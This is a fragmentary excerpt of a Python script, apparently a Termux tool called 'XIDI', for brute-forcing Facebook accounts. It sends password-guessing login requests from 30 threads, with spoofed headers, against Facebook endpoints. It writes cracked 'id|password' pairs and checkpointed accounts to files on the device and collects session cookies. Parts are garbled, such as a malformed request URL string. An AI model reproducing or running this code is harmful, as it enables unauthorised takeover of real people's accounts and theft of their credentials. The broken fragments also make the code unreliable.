...
os.system('xdg-open https://www.instagram.com/Azam.alyy/')
print('\n\033[1;97m [•] checking update \n wait a few sec...')
...
def login():
        ...
        try:
                data = requests.post("https://x.facebook.com/a/bz', params=params, cookies=cookies, headers=headers, data=data", headers = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5559.221 Safari/537.36","referer": "https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8/","host": "x.facebook.com","origin": "https://x.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"accept': '*/*","content-type":"multipart/form-data; boundary=----WebKitFormBoundaryMIVVnum3zgqH206d"}, cookies = {"cookie":cookies})
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.instagram.com/Azam.alyy/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100010399241489/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.instagram.com/Azam.alyy/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        else:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as XIDI:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        XIDI=session.cookies.get_dict().keys()
                        if "c_user" in XIDI:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m XIDI-OK %s | %s'%(ids,pas))
                                open('/sdcard/XIDI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in XIDI:
                                if 'y' in pcp:
                                        print('\r\033[1;91m XIDI-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XIDI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryMIVVnum3zgqH206d',
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5559.221 Safari/537.36',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVqR4x02ZSQ',
    ...
    'x_fb_background_state': '1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m XIDI-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XIDI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
    ...
    'x_fb_background_state': '1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mXIDI-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XIDI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    'x_fb_background_state': '1',}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/XIDI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m XIDI-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/XIDI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mXIDI-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XIDI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
